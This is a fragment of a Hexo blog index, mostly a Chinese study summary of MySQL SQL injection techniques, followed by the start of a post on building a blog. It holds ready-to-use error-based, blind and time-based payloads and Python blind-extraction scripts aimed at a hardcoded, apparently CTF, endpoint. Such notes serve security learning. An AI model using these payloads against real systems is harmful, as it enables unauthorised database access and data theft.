class=\"line\">group_by：按列名进行分组，一般配合count(*)进行统计数量</span><br><span class=\"line\">count(*)：对表中的数字行进行统计</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Payload：-1\"><a href=\"#Payload：-1\" class=\"headerlink\" title=\"Payload：\"></a>Payload：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (select 1 from (select count(*),concat(payload,floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Extractvalue\"><a href=\"#2-Extractvalue\" class=\"headerlink\" title=\"2.Extractvalue:\"></a>2.Extractvalue:</h3><h4 id=\"原理：-1\"><a href=\"#原理：-1\" class=\"headerlink\" title=\"原理：\"></a>原理：</h4><p>extract的第二个参数要求是<code>xpath格式字符串</code>，所以我们已用这一个特性，进行报错，最大长度是32位，超过32位不显示</p>\n<h4 id=\"Payload：-2\"><a href=\"#Payload：-2\" class=\"headerlink\" title=\"Payload：\"></a>Payload：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (extractvalue(1,concat(0x7e,(payload),0x7e)));</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-Updatexml：\"><a href=\"#3-Updatexml：\" class=\"headerlink\" title=\"3.Updatexml：\"></a>3.Updatexml：</h3><h4 id=\"原理：-2\"><a href=\"#原理：-2\" class=\"headerlink\" title=\"原理：\"></a>原理：</h4><p>和extractvalue相同，最大长度同样是32位</p>\n<h4 id=\"Payload\"><a href=\"#Payload\" class=\"headerlink\" title=\"Payload:\"></a>Payload:</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (updatexml(1,concat(0x7e,(payload),0x7e),1));</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-列名重复报错：\"><a href=\"#4-列名重复报错：\" class=\"headerlink\" title=\"4.列名重复报错：\"></a>4.列名重复报错：</h3><h4 id=\"原理：-3\"><a href=\"#原理：-3\" class=\"headerlink\" title=\"原理：\"></a>原理：</h4><p>限制版本：Mysql 5.0.12 &lt;= 版本 &lt;= Mysql 5.0.51</p>\n<p>在MySQL中，当列名重复了会发生报错，我们可以<code>name_const</code>来制造一个列，但是函数的参数要求必须是常量，所以限制比较大，在实际的测试中通常搭配<code>join</code>函数来使用</p>\n<h3 id=\"5-其他报错注入：\"><a href=\"#5-其他报错注入：\" class=\"headerlink\" title=\"5.其他报错注入：\"></a>5.其他报错注入：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.geometrycollection()</span><br><span class=\"line\"></span><br><span class=\"line\">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class=\"line\"></span><br><span class=\"line\">2.multipoint()</span><br><span class=\"line\"></span><br><span class=\"line\">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class=\"line\"></span><br><span class=\"line\">3.polygon()</span><br><span class=\"line\"></span><br><span class=\"line\">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class=\"line\"></span><br><span class=\"line\">4.multipolygon()</span><br><span class=\"line\"></span><br><span class=\"line\">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class=\"line\"></span><br><span class=\"line\">5.linestring()</span><br><span class=\"line\"></span><br><span class=\"line\">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class=\"line\"></span><br><span class=\"line\">6.multilinestring()</span><br><span class=\"line\"></span><br><span class=\"line\">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class=\"line\"></span><br><span class=\"line\">7.exp()</span><br><span class=\"line\"></span><br><span class=\"line\">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、盲注：\"><a href=\"#三、盲注：\" class=\"headerlink\" title=\"三、盲注：\"></a>三、盲注：</h2><h3 id=\"1-布尔盲注：\"><a href=\"#1-布尔盲注：\" class=\"headerlink\" title=\"1.布尔盲注：\"></a>1.布尔盲注：</h3><h4 id=\"原理：-4\"><a href=\"#原理：-4\" class=\"headerlink\" title=\"原理：\"></a>原理：</h4><p>布尔盲注有两种情况，一种是通过页面返回True和False，进行判断，第二种是Order by盲注</p>\n<h5 id=\"1-True-or-Falese：\"><a href=\"#1-True-or-Falese：\" class=\"headerlink\" title=\"1.True or Falese：\"></a>1.True or Falese：</h5><p>通过判断ascii码的大小来猜测字段名，表名等数据</p>\n<h6 id=\"Payload：-3\"><a href=\"#Payload：-3\" class=\"headerlink\" title=\"Payload：\"></a>Payload：</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&apos; and 1=(ord(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)=%d) -- -</span><br></pre></td></tr></table></figure>\n\n<p>通过这个原理我们可以写出脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#普通盲注脚本</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">url= <span class=\"string\">\"http://47.96.135.208:8802/web2/search.php\"</span></span><br><span class=\"line\">s = <span class=\"string\">','</span>+<span class=\"string\">'_'</span>+string.ascii_lowercase+<span class=\"string\">'1234567890'</span>+string.ascii_uppercase+<span class=\"string\">'&#123;'</span>+<span class=\"string\">'&#125;'</span></span><br><span class=\"line\">p = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">10000</span>):</span><br><span class=\"line\">    f = <span class=\"number\">0</span></span><br><span class=\"line\">    print(i,<span class=\"string\">':'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">        <span class=\"comment\">#sql = \"1' and 1=(ord(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d)-- -\"%(i,ord(j)) #爆表名</span></span><br><span class=\"line\">        <span class=\"comment\">#sql = \"1' and 1=(ord(mid((select group_concat(column_name) from information_schema.columns where table_name='f111ag'),%d,1))=%d)-- -\"%(i,ord(j)) #爆字段名</span></span><br><span class=\"line\">        sql = <span class=\"string\">\"1' and 1=(ord(mid((select group_concat(flag) from f111ag),%d,1))= %d)-- -\"</span>%(i,ord(j))</span><br><span class=\"line\">        data = &#123;<span class=\"string\">\"id\"</span> : sql&#125;</span><br><span class=\"line\">        r = requests.get(url,params=data,timeout=<span class=\"literal\">None</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"Click\"</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            f = <span class=\"number\">1</span></span><br><span class=\"line\">            p += j</span><br><span class=\"line\">            print(p)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> f == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">print(p)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#二分法盲注脚本</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">url= <span class=\"string\">\"http://47.96.135.208:8802/web2/search.php\"</span></span><br><span class=\"line\">flag=<span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">payload</span><span class=\"params\">(i,j)</span>:</span></span><br><span class=\"line\">    <span class=\"comment\">#sql = \"1' and 1=(ord(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))&gt;%d)-- -\"%(i,j) #爆表名</span></span><br><span class=\"line\">    <span class=\"comment\">#sql = \"1' and 1=(ord(mid((select group_concat(column_name) from information_schema.columns where table_name='f111ag'),%d,1))&gt;%d)-- -\"%(i,j) #爆字段名</span></span><br><span class=\"line\">    sql = <span class=\"string\">\"1' and 1=(ord(mid((select group_concat(flag) from f111ag),%d,1))&gt;%d)-- -\"</span> % (i,j)</span><br><span class=\"line\">    data=&#123;<span class=\"string\">\"id\"</span>:sql&#125;</span><br><span class=\"line\">    r=requests.get(url,params=data)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">\"Click\"</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">        res = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> :</span><br><span class=\"line\">        res = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> res</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">exp</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">global</span> flag</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">10000</span>):</span><br><span class=\"line\">        print(i,<span class=\"string\">':'</span>)</span><br><span class=\"line\">        low = <span class=\"number\">31</span></span><br><span class=\"line\">        high = <span class=\"number\">127</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low&lt;=high:</span><br><span class=\"line\">            mid = (low+high)//<span class=\"number\">2</span></span><br><span class=\"line\">            res = payload(i,mid)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> res:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid - <span class=\"number\">1</span></span><br><span class=\"line\">        f = int((low + high +<span class=\"number\">1</span>))//<span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (f==<span class=\"number\">127</span> <span class=\"keyword\">or</span> f==<span class=\"number\">31</span>):</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        flag += chr(f)</span><br><span class=\"line\">        print(flag)</span><br><span class=\"line\">exp()</span><br><span class=\"line\">print(flag)</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"2-order-by\"><a href=\"#2-order-by\" class=\"headerlink\" title=\"2.order by:\"></a>2.order by:</h5><p>在MySQL中<code>order by rand(True)</code>和<code>order by rand(False)</code>的结果排序是不同的：</p>\n<img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201114160130.png\">\n\n<h6 id=\"Payload：-4\"><a href=\"#Payload：-4\" class=\"headerlink\" title=\"Payload：\"></a>Payload：</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by rand(database()=&apos;php&apos;)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201114160554.png\" alt></p>\n<p>和True的顺序符合，所以当前数据库为php，可以利用这个特性，进行布尔盲注，猜测数据库里的内容</p>\n<h3 id=\"2-时间盲注：\"><a href=\"#2-时间盲注：\" class=\"headerlink\" title=\"2.时间盲注：\"></a>2.时间盲注：</h3><h4 id=\"原理：-5\"><a href=\"#原理：-5\" class=\"headerlink\" title=\"原理：\"></a>原理：</h4><p>有时候注入的页面既不会报错，也不会回显是否正确，这个时候我们需要用延时来判断，我们查询的结果是否正确。</p>\n<h4 id=\"常用函数：-1\"><a href=\"#常用函数：-1\" class=\"headerlink\" title=\"常用函数：\"></a>常用函数：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sleep(x)：使查询结果返回的时间延迟x秒</span><br><span class=\"line\">ord()：返回字符串的第一个字符的ascii值</span><br><span class=\"line\">benchmark(count,expr)：重复计算expr表达式count次，达到延时</span><br><span class=\"line\">ascii()：返回字母的ascii码值</span><br><span class=\"line\">substr(string string,num start,num length)：截取字符串，string被截取字符串，start为起始位置，length为长度</span><br><span class=\"line\">mid(string, start, length)：截取去字符串，string被截取字符串，start为起始位置，length为长度</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"1-常用-sleep\"><a href=\"#1-常用-sleep\" class=\"headerlink\" title=\"1.(常用)sleep():\"></a>1.(常用)sleep():</h5><p>通过sleep的延时来判断，查询的结果是否正确。</p>\n<h6 id=\"Payload：-5\"><a href=\"#Payload：-5\" class=\"headerlink\" title=\"Payload：\"></a>Payload：</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&apos; and if(1=(ord(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)=%d),sleep(3),1) -- -</span><br></pre></td></tr></table></figure>\n\n<p>脚本如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">url= <span class=\"string\">\"http://47.96.135.208:8802/web2/search.php\"</span></span><br><span class=\"line\">s = <span class=\"string\">','</span>+<span class=\"string\">'_'</span>+string.ascii_lowercase+<span class=\"string\">'1234567890'</span>+string.ascii_uppercase+<span class=\"string\">'&#123;'</span>+<span class=\"string\">'&#125;'</span></span><br><span class=\"line\">p = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">10000</span>):</span><br><span class=\"line\">    f = <span class=\"number\">0</span></span><br><span class=\"line\">    print(i,<span class=\"string\">':'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">        <span class=\"comment\">#sql = \"1' and if(1=(ord(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d),sleep(3),1)-- -\"%(i,ord(j)) #爆表名</span></span><br><span class=\"line\">        <span class=\"comment\">#sql = \"1' and if(1=(ord(mid((select group_concat(column_name) from information_schema.columns where table_name='f111ag'),%d,1))=%d),sleep(3),1)-- -\"%(i,ord(j)) #爆字段名</span></span><br><span class=\"line\">        sql = <span class=\"string\">\"1' and if(1=(ord(mid((select group_concat(flag) from f111ag),%d,1))= %d),sleep(3),1)-- -\"</span>%(i,ord(j))</span><br><span class=\"line\">        data = &#123;<span class=\"string\">\"id\"</span> : sql&#125;</span><br><span class=\"line\">        r = requests.get(url,params=data,timeout=<span class=\"literal\">None</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"Click\"</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            f = <span class=\"number\">1</span></span><br><span class=\"line\">            p += j</span><br><span class=\"line\">            print(p)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> f == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">print(p)</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"2-benchmark\"><a href=\"#2-benchmark\" class=\"headerlink\" title=\"2.benchmark():\"></a>2.benchmark():</h5><p>通过大量的运算，来达到延时的效果。</p>\n<h6 id=\"Payload：-6\"><a href=\"#Payload：-6\" class=\"headerlink\" title=\"Payload：\"></a>Payload：</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&apos; or if(ascii(substr(database(),1,1))&gt;114,benchmark(10000000,sha(1)),0)#</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"3-笛卡尔积：\"><a href=\"#3-笛卡尔积：\" class=\"headerlink\" title=\"3.笛卡尔积：\"></a>3.笛卡尔积：</h5><p>笛卡尔积可以将多个表合并成一个表，这样会消耗大量的时间来查询，造成延时的效果</p>\n<h6 id=\"Payload：-7\"><a href=\"#Payload：-7\" class=\"headerlink\" title=\"Payload：\"></a>Payload：</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and if(ascii(substr(database(),1,1))&gt;0,(select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C),0)</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"4-GET-LOCK：\"><a href=\"#4-GET-LOCK：\" class=\"headerlink\" title=\"4.GET_LOCK：\"></a>4.GET_LOCK：</h5><p>当我们在一个session中对关键字进行了get_lock，那么在另一个session再次对关键字进行get_lock，就会执行命令，进行延时</p>\n<p>session A：对关键词<code>Lucia</code>进行第一次锁定，没有发生延时。</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201114185322.png\" alt></p>\n<p>session B：对关键词<code>Lucia</code>再次锁定，发生延迟</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201114185433.png\" alt></p>\n<h5 id=\"5-Rlike-rpad（MySQL5-7）：\"><a href=\"#5-Rlike-rpad（MySQL5-7）：\" class=\"headerlink\" title=\"5.Rlike+rpad（MySQL5.7）：\"></a>5.Rlike+rpad（MySQL5.7）：</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpad(1,3,&apos;str&apos;)：用字符串str填充第一位的字符串达到第二位的字符串。</span><br><span class=\"line\">rlike： expr rlike pat，判断输入的expr是否符合正则表达式。</span><br></pre></td></tr></table></figure>\n\n<p>通过填充大量的数据，然后匹配很长的正则表达式，服务器需要大量的时间处理数据，达到延时的目的</p>\n<h6 id=\"Payload：-8\"><a href=\"#Payload：-8\" class=\"headerlink\" title=\"Payload：\"></a>Payload：</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from table1 where 1=1 and if(mid(user(),1,1)=&apos;r&apos;,concat(rpad(1,349525,&apos;a&apos;),rpad(1,349525,&apos;a&apos;),rpad(1,349525,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd&apos;,1);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、堆叠注入-预编译：\"><a href=\"#四、堆叠注入-预编译：\" class=\"headerlink\" title=\"四、堆叠注入+预编译：\"></a>四、堆叠注入+预编译：</h2><p>在mysql中允许一条语句执行多条sql命令，每条命令之间以<code>;</code>为间隔符。使用条件十分有限在php中需要使用<code>mysqli_multi_query()</code>函数才能支持多条sql语句同时执行，而在实际情况下，大部分调用MySQL数据库都使用的是<code>mysqli_query()</code>函数</p>\n<p>在真实环境中，当我们发现可以进行堆叠注入时，往往存在一些限制或者过滤，所以我们通常配合预编译，来绕过这些限制。</p>\n<p>预编译的基本语法如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PREPARE stmt_name FROM preparable_stmt;</span><br><span class=\"line\"></span><br><span class=\"line\">EXECUTE stmt_name [USING @var_name [, @var_name] ...];</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201116163817.png\" alt></p>\n<p>其他两种：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">prepare stmt from &quot;select ? as test&quot;;</span><br><span class=\"line\">set @test=user();</span><br><span class=\"line\">execute stmt using @test;</span><br><span class=\"line\"></span><br><span class=\"line\">set @s=&apos;select ?&apos;;</span><br><span class=\"line\">prepare stmt2 from @s;</span><br><span class=\"line\">set @t=user();</span><br><span class=\"line\">execute stmt2 using @t;</span><br></pre></td></tr></table></figure>\n\n<p>当select被过滤，可以用handler来代替</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">handler 表名 open; //打开表</span><br><span class=\"line\">handler 表名 read first; //查询第一条数据</span><br><span class=\"line\">handler 表名 read next; //查询下一条数据</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"五、无列名注入：\"><a href=\"#五、无列名注入：\" class=\"headerlink\" title=\"五、无列名注入：\"></a>五、无列名注入：</h2><p>当<code>information_schema(MySQL&gt;=5)</code>被过滤，我们无法获得table_schema，table_name，column_name等信息。在5.6.x过后，MySQL默认引擎换成了innodb，innodb增加了两张新表：<code>innodb_table_stats</code>和<code>innodb_index_stats</code>,在<code>innodb_table_stats</code>表中保存了数据库变动的记录，也就是可以看到新创建或者更改的数据库的表。</p>\n<p>所以在注入的过程中，我们使用<code>innodb_table_stats</code>来Bypass information获取表名，但是这种方法看不了列名，所以出现了无列名注入</p>\n<h3 id=\"原理：-6\"><a href=\"#原理：-6\" class=\"headerlink\" title=\"原理：\"></a>原理：</h3><p>当进行联合查询的时候，会生成一个名为1，2，3，4的表</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201130211424.png\" alt></p>\n<p>我们可以用反引号将前面的数字括起来，会把该数字当做一个列查询</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201130212647.png\" alt></p>\n<p>当反引号被过滤的时候，我们可以采取别名的方式来进行，命名时的<code>as</code>可以省略</p>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20201130212726104.png\" alt></p>\n<h1 id=\"一些小Ticks：\"><a href=\"#一些小Ticks：\" class=\"headerlink\" title=\"一些小Ticks：\"></a>一些小Ticks：</h1><ol>\n<li><p>当<code>,</code>被过滤，我们可以使用join函数：</p>\n<blockquote>\n<p>join：把表之间的内容链接起来</p>\n</blockquote>\n</li>\n</ol>\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201130214617.png\" alt></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Payload：select * from users where id = &apos;1&apos; union select * from (select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema=database())b join (select 3)c join (select 4)d;</span><br></pre></td></tr></table></figure>\n\n","categories":["Summary"],"tags":["SQL","web"]},{"title":"搭建hexo+github博客和其中的一些小问题","url":"http://yoursite.com/2019/10/03/build-a-blog/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a><strong>前言</strong></h2><p>趁着国庆放假，终于把自己的博客搭好了，还是挺有成就感得，记录一下</p>\n<h1 id=\"搭建正文\"><a href=\"#搭建正文\" class=\"headerlink\" title=\"搭建正文 :\"></a><strong>搭建正文</strong> :</h1><hr>\n<h2 id=\"一、本地与Github的连接\"><a href=\"#一、本地与Github的连接\" class=\"headerlink\" title=\"一、本地与Github的连接\"></a><strong>一、本地与Github的连接</strong></h2><p>要想搭建好博客，就得先连接到Github上</p>\n<h3 id=\"1-一些必备的软件\"><a href=\"#1-一些必备的软件\" class=\"headerlink\" title=\"1.一些必备的软件\"></a><strong>1.一些必备的软件</strong></h3><ul>\n<li><a href=\"https://nodejs.org/en/\" target=\"_blank\" rel=\"noopener\">Node.js</a><blockquote>\n<p>安装好之后，在CMD中输入<code>node -v</code>和<code>npm -v</code>，如果出现版本号，代表安装成功.</p>\n</blockquote>\n</li>\n<li><a href=\"https://git-scm.com/\" target=\"_blank\" rel=\"noopener\">Git</a><blockquote>\n<p>Git安装好之后，在桌面右键会出现：<img src=\"https://i.loli.net/2019/10/03/YQEqoC2VR8tf5Dh.png\" alt=\"20191003134123.png\"></p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"2-注册一个github账号\"><a href=\"#2-注册一个github账号\" class=\"headerlink\" title=\"2.注册一个github账号\"></a><strong>2.注册一个github账号</strong></h3><p> 先进入<a href=\"https://github.com/\" target=\"_blank\" rel=\"noopener\">github</a>，然后点击右上角的<strong><em>Sign up</em></strong></p>\n<p> 进入<strong><em>Sign up</em></strong>页面后，按照流程注册账号<br><img src=\"https://i.loli.net/2019/10/03/gKZiSRB9jDbdfcY.png\" alt=\"20191003115036.png\"><br><img src=\"https://i.loli.net/2019/10/03/1W6STFuaQCDIU7s.png\" alt=\"20191003120216.png\"></p>\n<p>这里要注意一下：</p>\n<blockquote>\n<p>个人的网站网址是固定格式：username.github.io(当然之后你也可以自己买域名进行绑定)</p>\n<p>所以注册的时候Username不要乱填，<strong>谨慎谨慎谨慎！！</strong></p>\n</blockquote>\n<h3 id=\"3-创建New-Repository\"><a href=\"#3-创建New-Repository\" class=\"headerlink\" title=\"3.创建New Repository\"></a><strong>3.创建New Repository</strong></h3><p>登陆刚才创建好的Github，点击右上角的 <strong><em>+</em></strong> 